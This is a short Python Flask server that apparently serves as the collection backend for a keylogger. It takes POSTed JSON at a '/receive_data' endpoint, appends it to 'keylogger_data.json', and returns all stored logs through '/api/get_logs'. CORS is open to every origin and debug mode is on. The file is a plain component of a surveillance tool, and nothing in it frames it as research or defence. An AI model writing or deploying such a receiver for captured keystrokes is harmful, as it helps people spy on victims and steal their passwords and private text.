from flask import Flask, request, jsonify
from flask_cors import CORS
import json

app = Flask(__name__)
CORS(app)

DATA_FILE = "keylogger_data.json"

def save_data(data):
    try:
        with open(DATA_FILE, "a") as file:
            json.dump(data, file)
            file.write("\n")  # מפריד שורות לכל אובייקט JSON
    except Exception as e:
        print("Error saving data:", e)




@app.route('/receive_data', methods=['POST'])
def receive_data():
    data = request.get_json()
    save_data(data)
    if not data:
        return jsonify({"error": "No data received"}), 400

    #print(f"📥 Data received: {data}")
    return jsonify({"message": " Data received successfully!"}), 200


@app.route('/api/get_logs', methods=['GET'])
def get_logs():
    try:
        with open(DATA_FILE, "r") as file:
            logs = [json.loads(line) for line in file.readlines()]
        return jsonify(logs)
    except FileNotFoundError:
        return jsonify([])


if __name__ == '__main__':
    app.run(debug=True)
